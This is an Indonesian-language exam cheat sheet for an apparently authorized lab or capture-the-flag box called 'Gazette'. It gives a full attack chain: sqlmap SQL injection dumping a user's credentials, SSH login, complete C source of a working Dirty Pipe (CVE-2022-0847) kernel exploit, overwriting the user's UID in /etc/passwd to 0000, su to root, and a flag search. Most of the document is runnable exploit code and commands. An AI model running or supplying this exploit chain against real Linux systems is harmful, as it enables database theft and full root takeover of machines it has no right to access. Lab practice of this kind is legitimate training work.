# Gazette Close Book — SQLi to Dirty Pipe Root

> Untuk ujian/lab berizin.  
> Fokus: SQLi → SSH `editor` → Dirty Pipe → root → cari flag.  
> Versi ujian tidak memasukkan cleanup. Karena Dirty Pipe mengubah `/etc/passwd`, gunakan snapshot lab atau reset VM setelah ujian.

---

## Data Hafalan

```text
TARGET      = 192.168.56.121
URL         = http://192.168.56.121:8000/news/detail?id=1
Credential = editor:password123
Kernel hint = Linux 5.10.70-1
Exploit     = /home/editor/dirtypipe
Target file = /etc/passwd
Cari flag   = find / -type f -iname "*flag*" 2>/dev/null
```

Inti celah:

```text
SQLi parameter id → dump credential editor
SSH editor → compile Dirty Pipe
cari offset UID editor pada /etc/passwd
ubah UID 1001 menjadi 0000
su - editor → root
setelah root, cari flag dengan find
```

---

## 1. Dump credential

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"

sqlmap -u "$URL"   -p id   --batch   -D gazette   -T users   --dump
```

Expected:

```text
editor
password123
```

## 2. SSH sebagai editor

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

Cek:

```bash
id
whoami
hostname
```

Expected:

```text
uid=1001(editor)
editor
```

## 3. Buat Dirty Pipe PoC

```bash
cd /home/editor

cat > dirtypipe.c <<'EOF'
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Adapted from the Dirty Pipe CVE-2022-0847 proof of concept.
 * Original author: Max Kellermann <max.kellermann@ionos.com>
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * Modified for an authorized security lab.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static void die(const char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}

static void prepare_pipe(int pipe_fd[2])
{
    if (pipe(pipe_fd) != 0) {
        die("pipe");
    }

    const unsigned int pipe_size =
        (unsigned int)fcntl(pipe_fd[1], F_GETPIPE_SZ);

    static char buffer[4096];

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (write(pipe_fd[1], buffer, size) != (ssize_t)size) {
            die("write pipe");
        }

        remaining -= size;
    }

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (read(pipe_fd[0], buffer, size) != (ssize_t)size) {
            die("read pipe");
        }

        remaining -= size;
    }
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(
            stderr,
            "Usage: %s TARGET_FILE OFFSET DATA\n",
            argv[0]
        );
        return EXIT_FAILURE;
    }

    const char *target_path = argv[1];
    loff_t offset = strtoll(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    if (offset <= 0) {
        fprintf(stderr, "Offset harus lebih besar dari 0\n");
        return EXIT_FAILURE;
    }

    if ((offset % 4096) == 0) {
        fprintf(
            stderr,
            "Offset tidak boleh tepat di batas halaman\n"
        );
        return EXIT_FAILURE;
    }

    loff_t next_page = (offset | 4095) + 1;

    if (offset + (loff_t)data_size > next_page) {
        fprintf(
            stderr,
            "Data melewati batas halaman 4096 byte\n"
        );
        return EXIT_FAILURE;
    }

    int target_fd = open(target_path, O_RDONLY);

    if (target_fd < 0) {
        die("open");
    }

    struct stat target_stat;

    if (fstat(target_fd, &target_stat) != 0) {
        die("fstat");
    }

    if (offset + (loff_t)data_size > target_stat.st_size) {
        fprintf(stderr, "Data melewati ukuran file\n");
        return EXIT_FAILURE;
    }

    int pipe_fd[2];
    prepare_pipe(pipe_fd);

    loff_t splice_offset = offset - 1;

    if (
        splice(
            target_fd,
            &splice_offset,
            pipe_fd[1],
            NULL,
            1,
            0
        ) != 1
    ) {
        die("splice");
    }

    ssize_t written = write(pipe_fd[1], data, data_size);

    if (written < 0) {
        die("write");
    }

    if ((size_t)written != data_size) {
        fprintf(
            stderr,
            "Short write: %zd dari %zu byte\n",
            written,
            data_size
        );
        return EXIT_FAILURE;
    }

    printf(
        "Berhasil menulis %zu byte pada offset %lld\n",
        data_size,
        (long long)offset
    );

    close(target_fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);

    return EXIT_SUCCESS;
}

EOF

gcc -O2 -Wall dirtypipe.c -o dirtypipe
```

## 4. Cari offset UID editor

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

Contoh hasil lab:

```text
2183:editor:x:1001:1001
```

Hitung offset UID:

```text
2183 + 9 = 2192
```

Rumus hafalan:

```text
offset hasil grep + 9
```

## 5. Ubah UID editor menjadi 0000

```bash
./dirtypipe /etc/passwd 2192 0000
```

Kalau offset berbeda, ganti `2192` dengan hasil hitungan aktual.

Cek cepat:

```bash
grep '^editor:' /etc/passwd
```

Expected:

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

## 6. Masuk root

```bash
su - editor
```

Password:

```text
password123
```

Cek:

```bash
whoami
id
```

Expected:

```text
root
uid=0(root)
```

## 7. Cari flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

Catat path yang muncul.

## 8. Baca flag dari path yang ditemukan

```bash
cat /PATH/FLAG
```

---

# Cheat Sheet Paling Pendek

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"
sqlmap -u "$URL" -p id --batch -D gazette -T users --dump

ssh editor@192.168.56.121
# password123

cd /home/editor
gcc -O2 -Wall dirtypipe.c -o dirtypipe

grep -bo 'editor:x:1001:1001' /etc/passwd
# offset = angka hasil grep + 9

./dirtypipe /etc/passwd 2192 0000
su - editor
# password123

whoami
id
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

---

## Catatan Penting Ujian

```text
Jangan menghafal 2192 sebagai angka mutlak.
Hafalkan: grep -bo → ambil angka depan → tambah 9.
Setelah root, cari flag dengan find.
```
